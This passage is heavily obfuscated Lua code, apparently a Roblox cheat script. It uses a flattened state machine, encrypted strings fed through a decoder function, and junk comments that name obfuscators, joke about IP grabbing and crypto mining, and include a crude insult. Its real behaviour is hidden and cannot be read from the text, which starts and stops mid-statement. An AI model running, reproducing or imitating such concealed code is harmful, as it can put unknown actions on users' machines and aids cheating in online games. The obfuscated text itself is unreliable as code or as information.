and 3167840 or 6651083--[[who the fuck uses mee6]] end--[[Please do not the skid. ]] end--[[Evon is not a bitcoin miner real]] else if A<8950597 then if A<8930417 then v=C[V]A=v and 2163266 or 5446822--[[rubi was here]] else r=P(r)R=nil Z=P(Z)h=nil X=P(X)V=P(V)Q=P(Q)o=P(o)b=nil k=P(k)f=nil D=nil y=P(y)y=n[i("\241\020\016\005",4283286851477)]G=nil f=m()M=nil k=23479 M=23324 X=n[i("\130\085\059\182",21390663667153)]V={}U=P(U)Q=23353 C[f]=V V=F[y]y=n[i("\251\145\104\196\070\109\158\162\230\087",4885674398150)]U=C[J]y=V[y]o={U(k)}U=n[i("\095\127\a\058",29854155009179)]y=y(V,q(o))Z=23490 V=F[U]U=n[i("\245\116\101\n\108\130\189\174\206\187",17571247439852)]o=C[J]k={o(M)}U=V[U]U=U(V,q(k))o=n[i("\098\200\131\109\142\191\'",22739324555961)]V=F[o]M=F[X]b=C[J]X=n[i("\189\058\201\023\130\178\188\061\024\191",3165487500164)]h={b(Q)}X=M[X]X=X(M,q(h))h=23383 M=C[J]b=M(h)k=X[b]M=23339 o=V(k)V=C[J]k=V(M)V=m()C[V]=k k=m()M=u(12714884,{J;V;f})C[k]=M M=m()X=u(1495597,{J,V;k;M})C[M]=X G=n[i("\047\196\149\093",1989704320829)]X=C[M]b=X()C[f]=b X=m()h=u(2130497,{J;f;k;X})C[X]=h Q=A D=F[G]G=C[J]R=G(Z)r=D[R]A=r and 5408933 or 7568103 h=r--[[DevFuscator V6 realðŸ¤¯ðŸ˜²]] end--[[who the fuck uses mee6]] else qR=C[V]AR=qR A=qR and 12546431 or 8371455--[[whats a jmesðŸ¤”]] end--[[who the fuck uses mee6]] end--[[loadstring = print (sukssesful deobfuskation)ðŸ˜ŽðŸ’…]] end--[[Evon is not a bitcoin miner real]] end--[[whats a jmesðŸ¤”]] end--[[someone stole my credit card now i cant buy peopleðŸ˜­ðŸ˜­ðŸ˜­]] end--[[free source code: dariandev.com/discord]] else if A<13190018 then if A<11659341 then if A<10036591 then if A<9438751 then if A<9255714 then if A<9226220 then if A<9203869 then pR=23505 nR=23379 VR=23385 T=C[J]iR=T(nR)LR=23401 T=C[J]nR=T(LR)aR=23426 tR=23427 zR=23365 KR=23413 JR=23382 T=C[J]LR=T(zR)T=C[J]PR=23326 CR=23345 zR=T(tR)T=C[J]tR=T(aR)BR=23477 T=10181046 aR=C[J]NR=aR(CR)sR=C[J]A=15056332 mR=sR(KR)sR=C[J]KR=sR(JR)sR=C[J]eR=n[i("\177\250\048\119",32086532388026)]JR=sR(VR)sR=C[J]VR=sR(PR)CR={[mR]=KR;[JR]=VR}JR=23413 mR=C[J]KR=mR(JR)PR=23385 mR=C[J]VR=23354 JR=mR(VR)mR=C[J]VR=mR(PR)PR=C[J]uR=PR(BR)BR=C[J]cR=BR(pR)PR=Q..cR mR=uR..PR cR=23435 uR=23385 sR={[KR]=JR,[VR]=mR}VR=23413 KR=C[J]JR=KR(VR)KR=C[J]PR=23386 VR=KR(PR)xR=23491 KR=C[J]PR=KR(uR)uR=C[J]BR=uR(cR)pR=F[eR]eR=C[J]lR=eR(xR)cR=pR[lR]lR=23458 pR=C[J]eR=pR(lR)uR=cR..eR KR=BR..uR mR={[JR]=VR,[PR]=KR}PR=23393 aR={CR;sR,mR}mR=23338 CR=C[J]sR=CR(mR)BR=23432 mR=C[J]JR=23466 KR=mR(JR)JR=C[J]VR=JR(PR)PR=C[J]uR=PR(BR)JR=R..uR mR=VR..JR CR={[KR]=mR}Z={[iR]=nR,[LR]=zR;[tR]=T;[NR]=aR,[sR]=CR}iR=n[i("\113\234\023\093\050\237\161\043\000\170\100\222\217\185\020\125",22397864235387)]T=F[iR]iR=T(w,Z)Z=nil--[[someone stole my credit card now i cant buy peopleðŸ˜­ðŸ˜­ðŸ˜­]] else W=m()g=n[i("~\242\175\240",14842786199039)]aR=0 C[W]=j qR=23399 T=23467 I=F[g]g=C[J]nR=1 w=g(T)A=I[w]T=255 LR=n[i("\180\242\125\125\157\050\212\111",6813099792585)]g=1 FR=2 w=100 I=A(g,w)w=0 g=m()C[g]=I A=C[X]I=A(w,T)w=m()T=1 NR=10000 C[w]=I A=C[X]iR=C[g]I=A(T,iR)T=m()C[T]=I I=C[X]iR=I(nR,FR)I=1 A=iR==I FR=23445 I=m()C[I]=A iR=C[J]nR=iR(FR)FR=C[J]AR=FR(qR)qR=F[LR]zR=C[X]tR={zR(aR,NR)}LR=qR(q(tR))A=n[i("\062\239\234\179",34454205365591)]tR=23399 qR=C[J]zR=qR(tR)FR=LR..zR A=R[A]iR=AR..FR FR=n[i("\226\086\214\061\083",12946500267801)]A=A(R,nR,iR)iR=m()AR=e(12443004,{X;W,r;y,J;V;Z;I,iR;g;T,w,Q})C[iR]=A nR=F[FR]FR={nR(AR)}A={q(FR)}nR=A A=C[I]A=A and 13953450 or 9026836--[[free source code: dariandev.com/discord]] end--[[free source code: dariandev.com/discord]] else if A<9247334 then I=n[i("\122\164\006\086\180\211\113\247",11269264353535)]w=n[i("\117\042",19103523784063)]v=F[I]g=F[w]I=v(g)v=n[i("\063\050",29232439519832)]A=9716521 F[v]=I--[[My uncle tickles me]] else A=3755122--[[Aztupbrew aka skiddware ðŸ™Œ]] end--[[rubi was here]] end--[[DevFuscator V6 realðŸ¤¯ðŸ˜²]] else if A<9360774 then if A<9285139 then nR=23347 Z=A h=D T=C[J]iR=T(nR)w=G[iR]nR=23493 T=C[J]iR=T(nR)g=w==iR A=g and 8419073 or 2437706 R=g--[[https://soundcloud.com/shieldenergy]] else R=n[i("\020\167\080\103\168",527223325163)]Z=23478 G=F[R]R=C[J]W=R(Z)D=G[W]A=11118931 Q=D--[[real moonsec v4!11ðŸ˜²ðŸ¤¯]] end--[[rubi was here]] else if A<9391631 then A=15817187--[[what am i doing with my life? making lego hacks]] else A=C[z[3]]N=A()N=n[i("\a\234\207\139",2553435982154)]A=F[N]K=1 N=A(K)K=1 A=C[z[3]]N=A()N=n[i("\072\116\164\040",10880557950869)]A=F[N]N=A(K)K=1 A=C[z[3]]N=A()N=n[i("\147\239\057\014",5338807276396)]A=F[N]N=A(K)A=C[z[3]]K=1 N=A()N=n[i("\038\044\095\140",4382074114033)]A=F[N]N=A(K)K=1 A=C[z[3]]N=A()N=n[i("\166\v\030\156",25756631162291)]A=F[N]N=A(K)A=C[z[3]]N=A()A=1867321--[[free source code: dariandev.com/discord]] end--[[whats a jmesðŸ¤”]] end--[[real moonsec v4!11ðŸ˜²ðŸ¤¯]] end--[[Override certified boronide fork]] else if A<9628115 then if A<9527039 then if A<9442005 then X=23379 s=L[1]x={a(3,q(L))}y=23390 N=n[i("\103\179\v\084",26434182930474)]f=23479 A=F[N]N=n[i("\188\161\243\229\255\149\242\247\220\189",14435825628292)]J=C[z[1]]V={J(f)}G=23345 K=L[2]N=A[N]N=N(A,q(V))J=N f=23375 N=C[z[1]]V=N(f)N=C[z[1]]f=N(y)A={[V]=f}h=23365 V=A y=23499 N=C[z[1]]k=23379 f=N(y)U=C[z[1]]o=U(k)k=C[z[1]]M=k(X)U=K[M]r=23426 S=23338 k=C[z[1]]X=23365 M=k(X)X=C[z[1]]b=X(h)k=K[b]h=23426 X=C[z[1]]b=X(h)W=23466 h=C[z[1]]Q=h(r)X=K[Q]h=C[z[1]]r=23345 Q=h(r)r=C[z[1]]D=r(G)h=K[D]r=C[z[1]]G=23338 D=r(G)G=C[z[1]]R=G(W)Z=C[z[1]]j=Z(S)S=23466 W=K[j]Z=C[z[1]]j=Z(S)G=W[j]r={[R]=G}y={[o]=U,[M]=k;[b]=X,[Q]=h,[D]=r}N={y}A={[f]=N}f=A A=n[i("\109\244\140\213\159\166\201\202\226\062",2035876628328)]N=n[i("\085\171\204\224\208\080\160",14658096969043)]A=J[A]K=nil b=23470 Q=23475 A=A(J,f)y=A X=23456 J=nil A=F[N]o=C[z[1]]h=23357 f=nil M=23476 k=o(M)o=C[z[1]]M=o(X)o=C[z[1]]X=o(b)o=C[z[1]]b=o(h)o=C[z[1]]h=o(Q)U={[k]=s;[M]=X,[b]=V;[h]=y}N=A(U)U=N U=nil V=nil s=nil y=nil N=n[i("\094\216\237\113\094",14426161656955)]A=F[N]M=23446 o=C[z[1]]k={o(M)}N=A(q(k))A=F[n[i("\004\162\136\024\199\184\195\066\066\251\150\042\189",28097459775031)]]N={}--[[Please do not the skid. ]]else LR=n[i("\089\079\211\178\162\063\202",10337228006811)]nR=F[LR]aR=n[i("\062\056\115\115",849355703063)]sR=23353 tR=F[aR]A=10070835 NR=C[J]CR={NR(sR)}aR=n[i("\178\049\222\233\194\061\124\139\138\244",3119315192665)]aR=tR[aR]aR=aR(tR,q(CR))tR=C[J]CR=23383 NR=tR(CR)zR=aR[NR]LR=nR(zR)nR=C[J]tR=23425 zR=nR(tR)tR=23444 iR=LR[zR]LR=C[J]zR={LR(tR)}nR=iR(q(zR))iR=n[i("\096\060\059\043\075\170\064",32269074068836)]iR=nR[iR]iR=iR(nR)iR=C[X]nR=iR()--[[(xA, qt, Sz) ha i broke ur regex]]end--[[loadstring = print (sukssesful deobfuskation)ðŸ˜ŽðŸ’…]] else if A<9575408 then Q=n[i("\227\071\000\132\018\231\016",17588427833340)]A=8315646 D=23330 h=F[Q]Q=h()h=C[J]r=h(D)h=true Q[r]=h--[[devfuscator free no virus 2021]] else A=1916474 V=nil f=nil--[[whats a jmesðŸ¤”]] end--[[https://soundcloud.com/shieldenergy]] end--[[Please do not the skid. ]] else if A<9725492 then if A<9712628 then A=11759975 G=23336 r=C[z[1]]D=r(G)r=11 Q=X[D]h=Q<r b=h--[[what am i doing with my life? making lego hacks]] else A=3755122--[[what am i doing with my life? making lego hacks]] end--[[Please do not the skid. ]] else if A<9886407 then qR=A tR=1 zR=nR[tR]tR=false LR=zR==tR AR=LR A=LR and 13582751 or 12248950--[[Evon is not a bitcoin miner real]] else C[V]=FR A=2303558--[[(xA, qt, Sz) ha i broke ur regex]] end--[[hey psst you the wrapper function is right there]] end--[[someone stole my credit card now i cant buy peopleðŸ˜­ðŸ˜­ðŸ˜­]] end--[[Override certified boronide fork]] end--[[real moonsec v4!11ðŸ˜²ðŸ¤¯]] else if A<11084308 then if A<10484458 then if A<10153926 then if A<10103432 then tR=23474 LR=C[J]zR=LR(tR)nR=T[zR]A=4129406 zR=n[i("\136\056\n\120\184\080\208\169\216",22672750531195)]LR=F[zR]iR=nR~=LR--[[who the fuck uses mee6]] else s=L[1]f=23479 K=L[2]x={a(3,q(L))}N=n[i("\139\046\029\095",26074468441819)]A=F[N]N=n[i("\218\064\046\'\148\041\087\051\046\070",25866156170777)]J=C[z[1]]N=A[N]V={J(f)}N=N(A,q(V))h=23357 b=23470 J=N f=23375 N=C[z[1]]y=23390 V=N(f)N=C[z[1]]f=N(y)N=C[z[1]]y=23394 A={[V]=f}V=A f=N(y)X=23456 A={[f]=K}f=A A=n[i("\127\093\021\166\076\168 \057\249\028",27337227363187)]A=J[A]M=23476 A=A(J,f)y=A J=nil N=n[i("\050\241\107\127\146\160\133",15827437500820)]A=F[N]o=C[z[1]]k=o(M)o=C[z[1]]M=o(X)o=C[z[1]]X=o(b)o=C[z[1]]b=o(h)o=C[z[1]]Q=23475 h=o(Q)f=nil U={[k]=s;[M]=X;[b]=V,[h]=y}y=nil M=23446 N=A(U)s=nil U=N K=nil V=nil N=n[i("\255\b\014\136\166",32522484872784)]A=F[N]o=C[z[1]]k={o(M)}N=A(q(k))A=F[n[i("\063\170\b\117\219\195\150\048\001\103\244\179",30154811895219)]]U=nil N={}--[[whats a jmesðŸ¤”]]end--[[loadstring = print (sukssesful deobfuskation)ðŸ˜ŽðŸ’…]] else if A<10374657 then o=n[i("\239\244\059\092\014\102",34624935525878)]A=false f=A A=C[J]b=n[i("\075\051\173\139\253",12185194081364)]U=23483 y=A(U)U=m()M=23423 C[U]=y y=F[o]o=C[J]k=o(M)A=y[k]o=m()y=m()C[y]=A A=c(712725,{U})C[o]=A k=m()A=false C[k]=A X=F[b]h=B(15608797,{k})b=X(h)A=b and 15693791 or 12672387 M=b--[[https://soundcloud.com/shieldenergy]] else zR=NR mR=C[J]JR=23332 zR=nil A=4624013 KR=mR(JR)sR=CR[KR]mR=sR()CR=nil--[[Override certified boronide fork]] end--[[DevFuscator V6 realðŸ¤¯ðŸ˜²]] end--[[mee6 what are you doing to my wife]] else if A<10816396 then if A<10727311 then tR=n[i("\061\050\118\a",34213679856759)]zR=F[tR]tR=n[i("\117\122\100\151\116\066\200\080\029\078",22067141660743)]aR=C[J]CR=23439 NR={aR(CR)}tR=zR[tR]tR=tR(zR,q(NR))NR=23397 zR=C[J]aR=zR(NR)LR=tR[aR]zR=C[J]aR=23417 tR=zR(aR)nR=LR[tR]LR=C[J]tR=23359 zR=LR(tR)A=14289332 iR=nR==zR Z=iR--[[Override certified boronide fork]] else s=L[1]A=n[i("",19338680419930)]N=1 J=#s V=2 x=J/V K=A J=x x=1 A=16495096 V=x x=0 f=V<x x=N-V--[[someone stole my credit card now i cant buy peopleðŸ˜­ðŸ˜­ðŸ˜­]] end--[[Obfuscated with luaobfuscator.com]] else if A<10962339 then LR=23401 pR=23505 aR=23426 nR=23379 T=C[J]iR=T(nR)CR=23345 T=C[J]nR=T(LR)T=C[J]zR=23365 LR=T(zR)KR=23413 T=C[J]tR=23427 zR=T(tR)VR=23385 T=C[J]tR=T(aR)PR=23369 aR=C[J]T=10181046 NR=aR(CR)sR=C[J]JR=23382 mR=sR(KR)sR=C[J]KR=sR(JR)sR=C[J]JR=sR(VR)sR=C[J]VR=sR(PR)CR={[mR]=KR,[JR]=VR}eR=n[i("\220\101\239\206",5783349957898)]mR=C[J]VR=23354 JR=23413 KR=mR(JR)mR=C[J]PR=23385 JR=mR(VR)mR=C[J]BR=23477 VR=mR(PR)PR=C[J]uR=PR(BR)BR=C[J]cR=BR(pR)PR=Q..cR mR=uR..PR sR={[KR]=JR;[VR]=mR}cR=23435 VR=23413 PR=23386 KR=C[J]JR=KR(VR)KR=C[J]uR=23385 VR=KR(PR)xR=23491 KR=C[J]PR=KR(uR)uR=C[J]BR=uR(cR)pR=F[eR]eR=C[J]A=15056332 lR=eR(xR)cR=pR[lR]pR=C[J]lR=23458 eR=pR(lR)uR=cR..eR KR=BR..uR mR={[JR]=VR,[PR]=KR}PR=23393 JR=23466 aR={CR;sR,mR}CR=C[J]mR=23338 sR=CR(mR)mR=C[J]BR=23432 KR=mR(JR)JR=C[J]VR=JR(PR)PR=C[J]uR=PR(BR)JR=R..uR mR=VR..JR CR={[KR]=mR}Z={[iR]=nR,[LR]=zR;[tR]=T,[NR]=aR;[sR]=CR}iR=n[i("\213\151\a\003\114\154\198\004\099\236\217\248\247\238\091\246",19228081636851)]T=F[iR]iR=T(w,Z)Z=nil--[[devfuscator free no virus 2021]] else V,U=f(J,V)A=V and 16065515 or 4233345--[[Mitochondria is the powerhouse of the cell]] end--[[whats a jmesðŸ¤”]] end--[[Evon is not a bitcoin miner real]] end--[[Override certified boronide fork]] else if A<11387749 then if A<11268866 then if A<11162033 then h=Q A=r A=Q and 2164802 or 8043253--[[loadstring = print (sukssesful deobfuskation)ðŸ˜ŽðŸ’…]] else N={f}A=F[n[i("\162\077\092\118\001\041\199\220\019\155\244\109\114\051",3643317194049)]]--[[what am i doing with my life? making lego hacks]]end--[[My uncle tickles me]] else if A<11351711 then sR=23468 zR=A mR=23448 NR=C[J]CR=NR(sR)nR=A NR=n[i("\059\057\168\097",23752967771753)]aR=T[CR]NR=aR[NR]CR=C[J]sR={CR(mR)}NR=NR(aR,q(sR))tR=not NR A=tR and 2806357 or 13246869 LR=tR--[[DevFuscator V6 realðŸ¤¯ðŸ˜²]] else Z=n[i("\155\110\071\238\094\124",23683172423208)]h=Q A=f[h]R=A W=o(R)A=W==Z A=A and 8544005 or 5975734--[[hey psst you the wrapper function is right there]] end--[[(xA, qt, Sz) ha i broke ur regex]] end--[[https://soundcloud.com/shieldenergy]] else if A<11449025 then if A<11396215 then N={K}A=F[n[i("\014\065\223\016\103\r\104\051\226\097\173\051\122\129",25282022792185)]]--[[(xA, qt, Sz) ha i broke ur regex]]else K=nil A=C[z[3]]x=A()N={}A=F[n[i("\094\082\106\235\239\026\094\241\245\r\252\103",15199279363915)]]--[[im telling my mommy ðŸ˜¤]]end--[[(xA, qt, Sz) ha i broke ur regex]] else if A<11609771 then A=nR A=iR and 11311961 or 186885--[[someone stole my credit card now i cant buy peopleðŸ˜­ðŸ˜­ðŸ˜­]] else D=n[i("\240\002\023\a",11875946998580)]R=23424 r=F[D]D=C[J]G=D(R)Q=r[G]T=23425 A=2843222 r=C[J]G=23392 D=r(G)h=Q[D]Q=m()C[Q]=h r=C[Q]R=23334 g=23425 D=C[J]G=D(R)h=r[G]G=n[i("\044\052\141\149",6950542940489)]D=F[G]G=C[J]Z=23377 R=G(Z)r=D[R]R=n[i("\076\127\005\174\219\067\212\110",8603082039116)]G=F[R]R=C[J]Z=R(g)g=23496 D=G[Z]R=C[J]iR=0 Z={R(g)}G=D(q(Z))LR=0 D=C[J]Z=23337 g=n[i("\085\113\244\194 \012\211",22936899081073)]R=D(Z)Z=F[g]g=C[J]w=g(T)D=Z[w]nR=0 w=1 T=0 g=w/T T=1 w=T/iR iR=1 T=iR/nR Z=D(g,w,T)G[R]=Z Z=23484 D=C[J]g=n[i("\219\221\191\248\000\232\204",35094175023019)]T=23425 R=D(Z)Z=F[g]g=C[J]w=g(T)D=Z[w]Z=D()nR=0 G[R]=Z D=C[J]Z=23468 w=23425 g=23452 R=D(Z)D=C[J]Z=D(g)G[R]=Z Z=n[i("\202\084\000\089\000\176\063\084",4245704740722)]R=F[Z]Z=C[J]g=Z(w)D=R[g]Z=C[J]w=23487 g={Z(w)}w=n[i("\064\139\204\079\183\035\095",6437278685035)]iR=23425 R=D(q(g))g=23485 D=C[J]Z=D(g)g=F[w]w=C[J]T=w(iR)D=g[T]iR=23425 g=D()w=n[i("\076\093\227\184\084\105\038",16357882149762)]R[Z]=g D=C[J]g=23453 Z=D(g)g=F[w]w=C[J]T=w(iR)D=g[T]T=1 iR=0 w=T/iR iR=1 T=iR/nR nR=1 iR=nR/LR g=D(w,T,iR)w=23471 R[Z]=g D=C[J]g=23468 T=n[i("\140\189\147\223 \084\153\033\166\081\073",14682793784682)]Z=D(g)D=C[J]g=D(w)R[Z]=g Z=n[i("\233\068\002\151",1812531512984)]D=F[Z]g=n[i("\197\252\041\000\222\217\163\240\208",18151085720072)]Z=F[g]T=Z[T]T={T(Z)}g=T[1]w=T[2]--[[hey psst you the wrapper function is right there]]end--[[the person who made this script ip grabbed a gorilla]] end--[[rubi was here]] end--[[who the fuck uses mee6]] end--[[mee6 what are you doing to my wife]] end--[[free source code: dariandev.com/discord]] else if A<12665903 then if A<12306708 then if A<11875507 then if A<11766942 then if A<11745694 then K=200 x=K A=12380538 K=1 N=1 J=K s={a(1,q(L))}K=0 V=J<K K=N-J--[[someone stole my credit card now i cant buy peopleðŸ˜­ðŸ˜­ðŸ˜­]] else A=b and 3610734 or 4727440--[[im telling my mommy ðŸ˜¤]] end--[[My uncle tickles me]] else if A<11784387 then I=nil A=15033291 H=nil--[[devfuscator free no virus 2021]] else tR=not aR LR=tR A=NR A=13246869--[[the person who made this script ip grabbed a gorilla]] end--[[someone stole my credit card now i cant buy peopleðŸ˜­ðŸ˜­ðŸ˜­]] end--[[(xA, qt, Sz) ha i broke ur regex]] else if A<12214475 then if A<12032909 then D,G=Q(r,D)A=D and 9271579 or 1377834--[[Aztupbrew aka skiddware ðŸ™Œ]] else A=7537382 tR=n[i("\070\254\195\b",35109207867321)]zR=F[tR]tR=n[i("\027\072\120\050\n\181\255\067\136\102",17547624398806)]tR=zR[tR]CR=23439 aR=C[J]NR={aR(CR)}tR=tR(zR,q(NR))zR=C[J]NR=23397 aR=zR(NR)LR=tR[aR]zR=C[J]aR=23417 tR=zR(aR)nR=LR[tR]tR=23497 LR=C[J]zR=LR(tR)iR=nR==zR Z=iR--[[Please do not the skid. ]] end--[[https://soundcloud.com/shieldenergy]] else if A<12263004 then FR=AR A=qR A=10018610--[[DevFuscator V6 realðŸ¤¯ðŸ˜²]] else j=C[V]W=j A=j and 15205328 or 16453623--[[im telling my mommy ðŸ˜¤]] end--[[DevFuscator V6 realðŸ¤¯ðŸ˜²]] end--[[who the fuck uses mee6]] end--[[Mitochondria is the powerhouse of the cell]] else if A<12536691 then if A<12370917 then if A<12340290 then M=o D=n[i("\195\219\190\186",33092659181667)]r=F[D]R=23491 D=C[z[1]]G=D(R)Q=r[G]h=M~=Q A=h and 9708328 or 11759975 b=h--[[loadstring = print (sukssesful deobfuskation)ðŸ˜ŽðŸ’…]] else iR=n[i("\132\r\023\029",32639526303421)]T=F[iR]iR=C[J]LR=23424 nR=iR(LR)w=T[nR]nR=23392 T=C[J]iR=T(nR)g=w[iR]A=13175186 w=C[J]iR=23327 T=w(iR)Z=g[T]g=n[i("\050\234\180\251",3191258090396)]g=Z[g]g=g(Z)G=g--[[Evon is not a bitcoin miner real]] end--[[DevFuscator V6 realðŸ¤¯ðŸ˜²]] else if A<12427919 then K=K+J N=K<=x f=not V N=f and N f=K>=x f=V and f N=f or N f=7813358 A=N and f N=15449560 A=A or N--[[DevFuscator V6 realðŸ¤¯ðŸ˜²]] else V=2 J=1 K=C[z[1]]x=K(J,V)K=1 s=x==K A=s and 2308678 or 8083703 N=s--[[someone stole my credit card now i cant buy peopleðŸ˜­ðŸ˜­ðŸ˜­]] end--[[real moonsec v4!11ðŸ˜²ðŸ¤¯]] end--[[free source code: dariandev.com/discord]] else if A<12579155 then if A<12545967 then k=#s M=2 o=k/M y=x k=s[y]U=o+k N=s[U]y=nil A=K..N K=A A=16495096--[[real moonsec v4!11ðŸ˜²ðŸ¤¯]] else LR=1 qR=nR[LR]A=8371455 AR=qR--[[Override certified boronide fork]] end--[[Mitochondria is the powerhouse of the cell]] else if A<12614091 then A=14144944 aR=C[J]CR=23355 NR={aR(CR)}tR=n[i("\017\141\049",19079900743017)]tR=T[tR]tR=tR(T,q(NR))LR=tR--[[rubi was here]] else w=3 g=w-v O=64 Y=O^g d=I*Y Y=1 O=4 A=S+d S=A d=v+Y v=d Y=v==O A=Y and 5586602 or 6781135--[[the person who made this script ip grabbed a gorilla]] end--[[Aztupbrew aka skiddware ðŸ™Œ]] end--[[what am i doing with my life? making lego hacks]] end--[[what am i doing with my life? making lego hacks]] end--[[Aztupbrew aka skiddware ðŸ™Œ]] else if A<12942330 then if A<12711908 then if A<12669724 then if A<12667087 then r=G A=R A=2251844--[[who the fuck uses mee6]] else iR=n[i("\188\026\181\136",32490271634994)]T=F[iR]iR=C[J]LR=23424 nR=iR(LR)w=T[nR]nR=23392 T=C[J]A=12666755 iR=T(nR)g=w[iR]iR=23327 w=C[J]T=w(iR)Z=g[T]g=n[i("\096\235\v\252",14013832213243)]g=Z[g]g=g(Z)G=g--[[Evon is not a bitcoin miner real]] end--[[im telling my mommy ðŸ˜¤]] else if A<12688238 then Q=23467 b=n[i("\070\155\255\066",4987682984485)]X=F[b]b=C[J]h=b(Q)A=X[h]h=n[i("\241\092\062\167\023",29492292971338)]X=m()C[X]=A r=23449 b=F[h]h=C[J]Q=h(r)G=n[i("\205\144\173\080\093",6149507094111)]A=b[Q]b=A D=F[G]Q=D r=A A=D and 9297180 or 11118931--[[(xA, qt, Sz) ha i broke ur regex]] else A=aR LR=tR A=8749323--[[devfuscator free no virus 2021]] end--[[what am i doing with my life? making lego hacks]] end--[[the person who made this script ip grabbed a gorilla]] else if A<12837460 then if A<12729273 then J=23479 N=n[i("\054\250\165\120",27010799886915)]s={a(1,q(L))}A=F[N]K=C[z[1]]N=n[i("\t\208\111\056\020\166\200\038\176\188",1408792266016)]N=A[N]x={K(J)}f=n[i("\214\087\017\038\164\012\014\125\030\r",34945994129185)]N=N(A,q(x))K=N N=n[i("\190\103\153\191\139\095\054\242\043",19452500526788)]A=F[N]x=C[z[2]]V=C[z[3]]f=K[f]J={f(K,V)}N=A(x,q(J))A=F[n[i("\029\088\170\061\192\016\208\019\137\186\152\194\233\098",32599796643480)]]K=nil N={}--[[Please do not the skid. ]]else Z=C[J]w=23425 G=nil g=Z(w)D=o[g]T=23429 g=C[J]w={g(T)}g=1 Z=D(q(w))h=nil D=n[i("\058\125\004\041\041\227\207",7649570200532)]D=Z[D]T=23395 U=nil M=P(M)k=P(k)w=23425 D=D(Z)Z=n[i("\036\132\092\024",31655948776233)]D=F[Z]y=nil Z=D(g)Q=P(Q)Z=C[J]g=Z(w)D=o[g]r=nil g=C[J]w={g(T)}Z=D(q(w))D=n[i("\171\002\208\236\191\080\249",11130747431038)]w=23425 D=Z[D]N={}g=3 D=D(Z)K=nil T=23381 Z=n[i("\174\195\160\189",27819352155444)]D=F[Z]Z=D(g)f=P(f)Z=C[J]g=Z(w)D=o[g]g=C[J]o=nil w={g(T)}R=nil x=P(x)A=F[n[i("\092\172\245\149\137\101\062\"\170\'\206\102",12340891397349)]]Z=D(q(w))D=n[i("\159\204\186\209\144\095\068",26534043967623)]V=P(V)J=P(J)D=Z[D]D=D(Z)D=C[X]X=P(X)Z=D()--[[https://soundcloud.com/shieldenergy]]end--[[who the fuck uses mee6]] else if A<12927633 then A=F[n[i("\228\232\198\055\123\154\213\088\121\087\143\201\220",24447699933424)]]N={}s=P(s)--[[https://soundcloud.com/shieldenergy]]else A=C[x]M=1 k=o[M]M=C[x]b=2 X=o[b]b=1 R=1 G=2 W=2 h=2 r=C[x]D=o[G]Q=r[D]D=C[x]G=o[R]R=1 r=D[G]G=o[R]R=1 D=G+R R=o[W]W=1 G=R-W A[k]=Q A=8032501 M[X]=r o[b]=D o[h]=G--[[https://soundcloud.com/shieldenergy]] end--[[im telling my mommy ðŸ˜¤]] end--[[the person who made this script ip grabbed a gorilla]] end--[[who the fuck uses mee6]] else if A<13020858 then if A<12963817 then if A<12958229 then FR=1 nR=1 iR=j+nR nR=j+FR A=16541689 T=k(R,iR,nR)iR=n[i("\082",25145653418874)]w=T~=iR O=w--[[Evon is not a bitcoin miner real]] else nn=n[i("\174\094\075\173\196\233\235\134\072\080\150\078\195\051\002\085\072 \209\088\202\097\254\123\143\004\070\191\214\110\116\n\137\180\185\206\031\047\006\211\152\156\116\080\195\043\232\164\229\t\053\220\089\234\120\223\102\125\048\194\029\209\248\118\069\021\036\001\004\098\085\018\132\255\084\049",26244124827513)]Kn=n[i("\174\056\184\227\134\100\187\090\065-\070\078\195\189\159\160\081\168\185\132",1058741748698)]Vn[43]=n[i("\207\156\156\019\112\222\135\038\218\122\027\086\065\061\102\005\075\050\151\053",20903170001931)]Vn[35]=n[i("\182\044\239\017\031\154\204\254",17639969013804)]ZR=n[i("\016\083\174\019\207\a\205\067\043\050\213\233",32876830488474)]Vn[20]=n[i("\197\145\000\242\087\152\254\151",28608576481299)]iR=n[i("\200\079\016\219\135\069\243\123\070\168\050\169\158\236\137\176",7642053778381)]x=n[i("\165\232\000\051\182\048\095\v",23328826807518)]Vn[26]=n[i("\000\145\072\220\080\161\b\016",18103839637980)]Vn[28]=n[i("\243\004\175\114\125\251\055\116",14164160656263)]Vn[84]=n[i("\183\065\203\121\100\100\118\153\109\120\181\147\149\105\173\226\246\058\102\102\178\019\200\230\075\"\177\049\136\t\096\221\138\121\244\195\111\066\250\255\053\073\236\214\127\127\201\188",31070741623048)]Vn[23]=n[i("\099\191\108\122\094\092\015\073\084\167\038\220\151\021\v\103\020\052\196\200",3206290934698)]cR=n[i("\164\055\087\050\127\018\127\069",27006504788543)]Vn[10]=n[i("\250\038\255\249",20687341308738)]O=n[i("\093\v\051\252\070\115\155-",28971512293733)]Vn[19]=n[i("\079\204\196\243\046\053\006\189",27804319311142)]Vn[36]=n[i("\051\189\089\106\048\"\214\114",2841207573078)]Vn[83]=n[i("\041\174\108\205\145\184\188\202\051\087\101\004\105\027\016\117",17762379317406)]kR=n[i("\118\103\220\119\235\001\164\227",8426983005864)]Vn[33]=n[i("\175\021\138\"\051\156\014\255",29295792220819)]Vn[77]=n[i("\091\119\083\190\225\068\162\179\149\048\122\249",24921234528937)]Vn[62]=n[i("\139\187\131\062\222\066\223\131\184\165\005\006\155\162\001\114\t\226\206\105\185\021\221\199\083\080\074\173\020\195\100\249",16790613310741)]RR=n[i("\017\043\028\035",14077184914230)]S=n[i("\052\132\134\150\073\n\179\134\210\085\254\177\012\092\244\137\196\163\199\073\117\189\150\159\153\142\164\029\086\217\n\127\a\225\237\006\188\219 \237\222\255\068\100\202\v\090\003\189\118\115\053\208\225\139\r",6690689488983)]Vn[41]=n[i("\106\043\107\149\165\199\142\235\079\017\005\064\171\194\176\247\025\253\113\249\028\122\182\050\053\r\101\086\083\'\196\074\016\248\102\092\102\017\140\166\213\085\250\056\083\151\037\089\000\108\176\206\098\104\143\181\052\203\249\122\137\174\255\055\203\131\112\250\025\217\083\099\205\191\181\105\040\105\091\185\074\075\077\035\147\147\042\027\124\195\191\203\137\a\156\149\116\186\130\138\193\233\049\063\232\243\186\218",31707489956697)]GR=n[i("\069\162\108\036\164\212\050\183",26479281463380)]Vn[29]=n[i("\131\150 